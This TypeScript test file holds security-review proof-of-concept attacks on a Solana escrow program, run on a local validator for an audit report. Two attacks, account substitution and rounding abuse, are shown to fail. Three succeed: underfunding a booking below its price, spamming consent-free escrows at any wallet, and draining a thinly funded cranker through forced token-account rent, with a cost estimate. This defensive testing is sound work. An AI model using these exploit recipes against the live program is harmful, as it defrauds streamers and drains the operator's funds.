/**
 * CASI Escrow — security review PoCs (Fable, 2026-08-10).
 *
 * These are NOT general coverage tests — tests/casi-escrow.ts already does
 * that (when it can run; see Finding #1 in
 * docs/fable-security-review-2026-08-10.md). This file exists to actually
 * *attempt* attacks against the deployed program on a local validator and
 * record what happened, per an attacker-mindset review: for every
 * instruction, "what's the worst thing a malicious viewer / streamer /
 * permissionless caller could construct here?"
 *
 * Every `it()` below either:
 *   (a) demonstrates a real problem (fund misdirection, unfair payout, or a
 *       cheap way to force an expensive state change on someone else), or
 *   (b) demonstrates an attack attempt that FAILED, and asserts on the exact
 *       error so the defense is proven load-bearing, not just assumed.
 *
 * Do not edit programs/casi-escrow/src/lib.rs from this file's findings —
 * the program is frozen pending external audit. This file is read-only
 * evidence for the report.
 *
 * Run with `anchor test` (runs alongside tests/casi-escrow.ts and tests/unit/*).
 */

import * as anchor from "@coral-xyz/anchor";
import BN from "bn.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createMint,
  getAccount,
  getAssociatedTokenAddressSync,
  getOrCreateAssociatedTokenAccount,
  mintTo,
} from "@solana/spl-token";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
} from "@solana/web3.js";
import { expect } from "chai";
import { randomBytes } from "crypto";

const ESCROW_SEED = Buffer.from("casi-escrow");
const CONFIG_SEED = Buffer.from("casi-config");
const USDC_DECIMALS = 6;
const TYPE_BEAM = 1;

function makeEscrowId(): number[] {
  return Array.from(randomBytes(32));
}

function derivePda(escrowId: number[], programId: PublicKey): PublicKey {
  const [pda] = PublicKey.findProgramAddressSync(
    [ESCROW_SEED, Buffer.from(escrowId)],
    programId,
  );
  return pda;
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

describe("casi-escrow — security review PoCs (2026-08-10)", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const program: any = anchor.workspace.CasiEscrow;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const payer: Keypair = ((provider.wallet as any).payer) as Keypair;

  let usdcMint: PublicKey;
  let configPda: PublicKey;

  async function airdrop(pubkey: PublicKey, sol = 2) {
    const sig = await provider.connection.requestAirdrop(pubkey, sol * LAMPORTS_PER_SOL);
    await provider.connection.confirmTransaction(sig, "confirmed");
  }

  async function balanceOf(ata: PublicKey): Promise<bigint> {
    try {
      const acc = await getAccount(provider.connection, ata);
      return acc.amount;
    } catch {
      return 0n;
    }
  }

  // ---------------------------------------------------------------------
  // Suite fixture: mint + GlobalConfig.
  //
  // tests/casi-escrow.ts (the pre-existing suite) never calls
  // initialize_config, so every one of its `initializeEscrow` calls fails
  // with AccountNotInitialized on `config` — see Finding #1. This file is
  // self-contained: it initializes its own config (no caps, mirroring
  // exactly how src/app/api/admin/init-escrow-config/route.ts calls it in
  // production: initializeConfig(0, 0)) so the PoCs below can actually run.
  // ---------------------------------------------------------------------
  before(async function () {
    this.timeout(30_000);
    [configPda] = PublicKey.findProgramAddressSync([CONFIG_SEED], program.programId);

    // Config is a single global PDA for the whole program deployment (not
    // per-test-run) — if this file is re-run against a validator that
    // already has it (e.g. iterating locally without a full `anchor test`
    // reset), reuse its accepted_mint instead of minting a new one that
    // would trip InvalidMint on every initialize_escrow call below.
    const existing = await provider.connection.getAccountInfo(configPda);
    if (existing) {
      const cfg = await program.account.globalConfig.fetch(configPda);
      usdcMint = cfg.acceptedMint as PublicKey;
      return;
    }

    usdcMint = await createMint(
      provider.connection, payer, payer.publicKey, null, USDC_DECIMALS,
    );
    const progInfo = await provider.connection.getAccountInfo(program.programId);
    if (!progInfo) throw new Error("casi_escrow program not found on localnet");
    const programDataAddress = new PublicKey(progInfo.data.slice(4, 36));
    await program.methods
      .initializeConfig(new BN(0), new BN(0)) // no cap, no floor — matches deployed config
      .accounts({
        initializer: payer.publicKey,
        config: configPda,
        acceptedMint: usdcMint,
        programData: programDataAddress,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([payer])
      .rpc();
  });

  interface Ctx {
    viewer: Keypair;
    streamer: Keypair;
    viewerAta: PublicKey;
    streamerAta: PublicKey;
    escrowId: number[];
    escrowPda: PublicKey;
    vault: PublicKey;
  }

  async function setupParties(mintAmount: bigint): Promise<Ctx> {
    const viewer = Keypair.generate();
    const streamer = Keypair.generate();
    await airdrop(viewer.publicKey);
    await airdrop(streamer.publicKey);

    const viewerAta = (
      await getOrCreateAssociatedTokenAccount(provider.connection, payer, usdcMint, viewer.publicKey)
    ).address;
    const streamerAta = getAssociatedTokenAddressSync(usdcMint, streamer.publicKey);

    if (mintAmount > 0n) {
      await mintTo(provider.connection, payer, usdcMint, viewerAta, payer, mintAmount);
    }

    const escrowId = makeEscrowId();
    const escrowPda = derivePda(escrowId, program.programId);
    const vault = getAssociatedTokenAddressSync(usdcMint, escrowPda, true);

    return { viewer, streamer, viewerAta, streamerAta, escrowId, escrowPda, vault };
  }

  async function initialize(ctx: Ctx, amount: bigint, durationSecs: bigint, typeVal: 0 | 1) {
    return program.methods
      .initializeEscrow(ctx.escrowId, new BN(amount.toString()), new BN(durationSecs.toString()), typeVal)
      .accounts({
        viewer: ctx.viewer.publicKey,
        streamer: ctx.streamer.publicKey,
        config: configPda,
        escrowState: ctx.escrowPda,
        vault: ctx.vault,
        viewerAta: ctx.viewerAta,
        usdcMint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([ctx.viewer])
      .rpc();
  }

  async function startBeam(ctx: Ctx) {
    return program.methods
      .startBeam(ctx.escrowId)
      .accounts({ streamer: ctx.streamer.publicKey, escrowState: ctx.escrowPda })
      .signers([ctx.streamer])
      .rpc();
  }

  async function settleBeam(
    ctx: Ctx,
    caller: Keypair,
    overrides: Partial<{ streamer: PublicKey; viewer: PublicKey; streamerAta: PublicKey; viewerAta: PublicKey }> = {},
  ) {
    const streamer = overrides.streamer ?? ctx.streamer.publicKey;
    const viewer = overrides.viewer ?? ctx.viewer.publicKey;
    return program.methods
      .settleBeam(ctx.escrowId)
      .accounts({
        caller: caller.publicKey,
        streamer,
        viewer,
        escrowState: ctx.escrowPda,
        vault: ctx.vault,
        streamerAta: overrides.streamerAta ?? getAssociatedTokenAddressSync(usdcMint, streamer),
        viewerAta: overrides.viewerAta ?? getAssociatedTokenAddressSync(usdcMint, viewer),
        usdcMint,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([caller])
      .rpc();
  }

  async function expectError(p: Promise<unknown>, variant: string) {
    try {
      await p;
      expect.fail(`expected tx to fail with ${variant} but it succeeded`);
    } catch (err) {
      const e = err as { message?: unknown; logs?: unknown };
      const msg = [
        typeof e?.message === "string" ? e.message : "",
        Array.isArray(e?.logs) ? e.logs.join("\n") : "",
      ].join("\n");
      expect(msg).to.include(variant);
    }
  }

  // =========================================================================
  // 1. FUND DRAIN — account substitution on settle_beam
  // =========================================================================
  describe("Attack: account substitution to redirect settle_beam funds", () => {
    it("a permissionless post-duration caller cannot redirect payout to itself by substituting streamer/viewer accounts", async () => {
      const total = 10_000_000n; // 10 USDC
      const duration = 2n;

      const victim = await setupParties(total);
      await initialize(victim, total, duration, TYPE_BEAM);
      await startBeam(victim);

      const attacker = Keypair.generate();
      await airdrop(attacker.publicKey);
      const attackerAta = (
        await getOrCreateAssociatedTokenAccount(provider.connection, payer, usdcMint, attacker.publicKey)
      ).address;

      await sleep(Number(duration) * 1000 + 1500); // past duration → permissionless window opens

      // Attacker is allowed to CALL settle_beam (permissionless post-duration
      // is by design) but tries to point BOTH payout destinations at itself
      // instead of the real streamer/viewer recorded on escrow_state.
      await expectError(
        settleBeam(victim, attacker, {
          streamer: attacker.publicKey,
          viewer: attacker.publicKey,
          streamerAta: attackerAta,
          viewerAta: attackerAta,
        }),
        "Unauthorized", // has_one = streamer / has_one = viewer on escrow_state
      );

      // Confirm the vault is untouched — no partial drain happened before the
      // constraint check reverted the whole transaction.
      expect(await balanceOf(victim.vault)).to.equal(total);

      // Now settle for real, proving the honest path still works and the
      // funds land with the correct parties, not the attacker.
      await settleBeam(victim, attacker); // attacker can still be the crank caller
      expect(await balanceOf(victim.streamerAta)).to.equal(total);
      expect(await balanceOf(attackerAta)).to.equal(0n);
    });

    it("cannot settle escrow A's vault while using escrow B's streamer/viewer identities (has_one binds vault, streamer, viewer, mint to the SAME escrow_state)", async () => {
      const totalA = 5_000_000n;
      const totalB = 9_000_000n;
      const duration = 2n;

      const escrowA = await setupParties(totalA);
      const escrowB = await setupParties(totalB); // richer vault — a tempting substitution target

      await initialize(escrowA, totalA, duration, TYPE_BEAM);
      await initialize(escrowB, totalB, duration, TYPE_BEAM);
      await startBeam(escrowA);
      await startBeam(escrowB);

      await sleep(Number(duration) * 1000 + 1500);

      const cranker = Keypair.generate();
      await airdrop(cranker.publicKey);

      // Try to settle A's escrow_state PDA but pay out B's streamer/viewer —
      // hoping the vault (which Anchor derives from escrow_state = A) still
      // gets pointed at A while the funds land with B's parties. Anchor's
      // associated_token::authority=streamer/viewer constraints should
      // reject this before the handler ever runs (ATA doesn't match).
      let rejected = false;
      try {
        await settleBeam(escrowA, cranker, {
          streamer: escrowB.streamer.publicKey,
          viewer: escrowB.viewer.publicKey,
        });
      } catch {
        rejected = true;
      }
      expect(rejected).to.equal(true);

      // Both vaults still hold their original, untouched balances.
      expect(await balanceOf(escrowA.vault)).to.equal(totalA);
      expect(await balanceOf(escrowB.vault)).to.equal(totalB);
    });
  });

  // =========================================================================
  // 2. FUND DRAIN — vesting-math rounding direction
  // =========================================================================
  describe("Attack: exploit settle_beam's floor-division rounding to over-claim", () => {
    it("a non-exact division always shorts the streamer (rounds down), never lets streamer or caller claim extra", async () => {
      // total=10 micro-USDC, duration=3s → true proportional share at t=1s is
      // 3.333..., which does NOT divide evenly. If rounding ever favored the
      // streamer (ceil instead of floor) a streamer could game timing to
      // always claim the rounded-up amount across many small escrows.
      const total = 10n;
      const duration = 3n;

      const ctx = await setupParties(total);
      await initialize(ctx, total, duration, TYPE_BEAM);
      await startBeam(ctx);

      await sleep(1100); // land inside [1s, 2s) of a 3s beam — non-exact tick
      await settleBeam(ctx, ctx.streamer);

      const streamerBal = await balanceOf(ctx.streamerAta);
      const viewerBal = await balanceOf(ctx.viewerAta);

      // Conservation holds exactly.
      expect(streamerBal + viewerBal).to.equal(total);
      // The streamer's take can never exceed floor(total * elapsed / duration)
      // for ANY elapsed <= duration — i.e. never more than what elapsed=duration
      // would have paid pro-rata at this total/duration. Concretely: since
      // duration=3 and total=10 doesn't divide evenly, the ONLY exact-integer
      // crossing points are t=0 (0) and t=3 (10); anything in between must
      // floor below the true proportional value, and the code's
      // checked_sub-based `refund = total - streamer_amt` means the streamer
      // can never see a remainder that would only be correct if it had
      // rounded up.
      expect(streamerBal < 4n).to.equal(true); // true value at t≈1.1s is ~3.67 → floor must be ≤3
    });
  });

  // =========================================================================
  // 3. TRUST BUG — no on-chain-vs-DB price integrity anywhere server-side
  // =========================================================================
  describe("Trust gap: escrowed amount is fully caller-chosen and never verified against an expected price", () => {
    it("initialize_escrow accepts an arbitrary amount unrelated to any external price — the program has no price concept, and (per code review) nothing server-side checks it either", async () => {
      // With GlobalConfig min/max both 0 (exactly how the deployed program is
      // initialized in src/app/api/admin/init-escrow-config/route.ts), a
      // Beam funded with 1 micro-USDC is indistinguishable, event-shape and
      // lifecycle-wise, from one funded with 50 USDC. Both succeed, both
      // fire the same start_beam / settle_beam instructions, both stamp
      // tx_signature via the Helius webhook the same way.
      //
      // This is not a program bug — a generic escrow primitive correctly has
      // no opinion about "the right price." It IS a real app-layer gap: see
      // the report for the code citations proving src/app/studio/page.tsx's
      // isPaymentConfirmed() and the Helius webhook
      // (src/app/api/webhooks/solana/route.ts, 'initialize_escrow' case)
      // never read/compare escrow_state.total_amount against
      // bookings.price_value. A viewer who signs the on-chain tx directly
      // (bypassing the SDK's default amountUsdc, e.g. via browser devtools
      // or a modified client) can fund far below the displayed price and
      // still have the booking look "paid" to the streamer.
      const cheapskate = await setupParties(1n); // 1 micro-USDC — the program's absolute floor (amount>0)
      await initialize(cheapskate, 1n, 60n, TYPE_BEAM);

      const state = await program.account.escrowState.fetch(cheapskate.escrowPda);
      expect(Number(state.totalAmount.toString())).to.equal(1);
      expect(state.status).to.deep.equal({ pending: {} });

      // Full lifecycle works exactly like a "real" payment — start, then
      // full-duration settle pays 100% of the (tiny) locked amount. Nothing
      // about this on-chain sequence differs from a legitimate $50 beam
      // except the number 1.
      await startBeam(cheapskate);
      await sleep(1200);
      await settleBeam(cheapskate, cheapskate.streamer); // caller is streamer here; elapsed<duration but streamer is a permitted early-caller
      expect(await balanceOf(cheapskate.streamerAta)).to.equal(0n); // duration=60s, only ~1.2s elapsed, floor(1*1.2/60)=0
      expect(await balanceOf(cheapskate.viewerAta)).to.equal(1n);
    });
  });

  // =========================================================================
  // 4. SPAM / DoS — consent-free escrow creation against an arbitrary pubkey
  // =========================================================================
  describe("Attack: open Pending escrows against a target who never signs anything", () => {
    it("`streamer` in initialize_escrow is an UncheckedAccount — no signature, ownership, or existence check is required", async () => {
      const victimStreamer = Keypair.generate(); // never funded, never signs, may not even be a real user's key
      const attacker = Keypair.generate();
      await airdrop(attacker.publicKey);

      const attackerAta = (
        await getOrCreateAssociatedTokenAccount(provider.connection, payer, usdcMint, attacker.publicKey)
      ).address;
      await mintTo(provider.connection, payer, usdcMint, attackerAta, payer, 1n);

      const escrowId = makeEscrowId();
      const escrowPda = derivePda(escrowId, program.programId);
      const vault = getAssociatedTokenAddressSync(usdcMint, escrowPda, true);

      // Succeeds with ZERO participation from victimStreamer — proving any
      // pubkey (a real onboarded streamer, an uninvolved wallet, even a
      // never-before-seen address) can be targeted with an unlimited number
      // of Pending escrows at no cost to the "streamer" and minimal cost
      // (1 micro-USDC + one tx fee) to the attacker. This is fully reachable
      // by calling the Anchor program directly — it does not go through
      // /api/bookings/create-solana, so none of that route's IP rate limit
      // or element_id ownership checks apply.
      await program.methods
        .initializeEscrow(escrowId, new BN(1), new BN(60), TYPE_BEAM)
        .accounts({
          viewer: attacker.publicKey,
          streamer: victimStreamer.publicKey, // no .signers() entry for this key — and it still works
          config: configPda,
          escrowState: escrowPda,
          vault,
          viewerAta: attackerAta,
          usdcMint,
          tokenProgram: TOKEN_PROGRAM_ID,
          associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([attacker])
        .rpc();

      const state = await program.account.escrowState.fetch(escrowPda);
      expect(state.streamer.toBase58()).to.equal(victimStreamer.publicKey.toBase58());
      expect(state.status).to.deep.equal({ pending: {} });
    });
  });

  // =========================================================================
  // 5. SPAM / DoS — cost asymmetry on permissionless / cranker-paid ATA init
  // =========================================================================
  describe("Attack: force a disproportionate SOL cost onto whoever processes a stranger's escrow", () => {
    it("a caller settling a permissionless post-duration Beam pays real SOL rent to create the OTHER party's fresh token account — cost is unrelated to the (tiny) escrowed amount", async () => {
      // This mirrors the exact `init_if_needed, payer = <caller|cranker>`
      // pattern used by cancel_stale_pending (programs/casi-escrow/src/lib.rs,
      // CancelStalePending's viewer_ata) and by settle_beam_delegated /
      // approve_flash_delegated (payer = cranker). We can't wait the real
      // 7 days PENDING_TIMEOUT_SECS requires on a live-clock localnet, so we
      // demonstrate the identical mechanic via settle_beam's permissionless
      // post-duration path, which reaches the same accounts-struct pattern
      // in test time. The cranker in CASI's production deployment is funded
      // with only ~0.05 SOL total (see DEPLOY.md) — this quantifies exactly
      // how many "fresh stranger" escrows it takes to drain that.
      const total = 100n; // 0.0001 USDC — deliberately tiny, to make the cost/value mismatch obvious
      const duration = 2n;

      const viewer = Keypair.generate();
      const freshStreamer = Keypair.generate(); // NEVER had a token account before
      await airdrop(viewer.publicKey);
      await airdrop(freshStreamer.publicKey, 0.01); // just enough for nothing token-related — freshStreamer never signs a token ix

      const viewerAta = (
        await getOrCreateAssociatedTokenAccount(provider.connection, payer, usdcMint, viewer.publicKey)
      ).address;
      await mintTo(provider.connection, payer, usdcMint, viewerAta, payer, total);

      const escrowId = makeEscrowId();
      const escrowPda = derivePda(escrowId, program.programId);
      const vault = getAssociatedTokenAddressSync(usdcMint, escrowPda, true);

      await program.methods
        .initializeEscrow(escrowId, new BN(total.toString()), new BN(duration.toString()), TYPE_BEAM)
        .accounts({
          viewer: viewer.publicKey,
          streamer: freshStreamer.publicKey,
          config: configPda,
          escrowState: escrowPda,
          vault,
          viewerAta,
          usdcMint,
          tokenProgram: TOKEN_PROGRAM_ID,
          associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([viewer])
        .rpc();

      await program.methods
        .startBeam(escrowId)
        .accounts({ streamer: freshStreamer.publicKey, escrowState: escrowPda })
        .signers([freshStreamer])
        .rpc();

      await sleep(Number(duration) * 1000 + 1500);

      // A well-meaning (or attacker-controlled, doesn't matter — the point is
      // whoever calls this pays) third-party cranker settles the now-eligible
      // permissionless Beam.
      const cranker = Keypair.generate();
      await airdrop(cranker.publicKey, 1);

      const freshStreamerAta = getAssociatedTokenAddressSync(usdcMint, freshStreamer.publicKey);
      const sig: string = await program.methods
        .settleBeam(escrowId)
        .accounts({
          caller: cranker.publicKey,
          streamer: freshStreamer.publicKey,
          viewer: viewer.publicKey,
          escrowState: escrowPda,
          vault,
          streamerAta: freshStreamerAta, // did not exist before this call
          viewerAta,
          usdcMint,
          tokenProgram: TOKEN_PROGRAM_ID,
          associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
          systemProgram: SystemProgram.programId,
        })
        .signers([cranker])
        .rpc();

      // Read the lamport delta straight off the confirmed transaction's own
      // ledger record rather than a follow-up getBalance() call — a plain
      // before/after getBalance() pair on this localnet was observed to lag
      // behind the transaction that had already confirmed (RPC read-after-
      // write skew), which made a real, verified-on-ledger cost look like
      // zero. meta.pre/postBalances is the authoritative record of what the
      // transaction itself did and isn't subject to that race.
      // getTransaction()'s history index can lag a beat behind the
      // confirmation .rpc() already waited for on this localnet — poll
      // briefly rather than assuming it's available on the first read.
      let tx: Awaited<ReturnType<typeof provider.connection.getTransaction>> = null;
      for (let attempt = 0; attempt < 10 && !tx; attempt++) {
        tx = await provider.connection.getTransaction(sig, {
          commitment: "confirmed",
          maxSupportedTransactionVersion: 0,
        });
        if (!tx) await sleep(300);
      }
      expect(tx, "transaction record should be retrievable").to.not.equal(null);
      const keys = tx!.transaction.message.getAccountKeys();
      let crankerIndex = -1;
      for (let i = 0; i < keys.length; i++) {
        if (keys.get(i)?.equals(cranker.publicKey)) { crankerIndex = i; break; }
      }
      expect(crankerIndex).to.be.greaterThan(-1);
      const spentLamports =
        (tx!.meta!.preBalances[crankerIndex] ?? 0) - (tx!.meta!.postBalances[crankerIndex] ?? 0);

      // Base tx fee alone is ~5000 lamports. Creating one fresh ATA costs
      // ~2,039,280 lamports (rent-exempt minimum for a 165-byte token
      // account) on top of that. Assert we actually paid ATA-creation rent,
      // not just the flat fee — proving the cost is real, not theoretical.
      expect(spentLamports).to.be.greaterThan(1_000_000);

      // The escrow moved 100 micro-USDC (0.0001 USDC — effectively dust).
      // The caller who processed it paid >1,000,000x that in lamports of
      // real SOL rent. An attacker who repeats this pattern (fresh viewer OR
      // fresh streamer wallet per escrow) forces this cost onto whichever
      // party's `init_if_needed, payer=` account processes it — the shared
      // cranker in the delegated/permissionless paths, per DEPLOY.md funded
      // with only ~0.05 SOL. ~0.05 SOL / ~0.00204 SOL per fresh ATA ≈ 24
      // such escrows would exhaust the entire cranker balance.
      expect(await balanceOf(freshStreamerAta)).to.equal(total); // full vest — duration elapsed
    });
  });
});
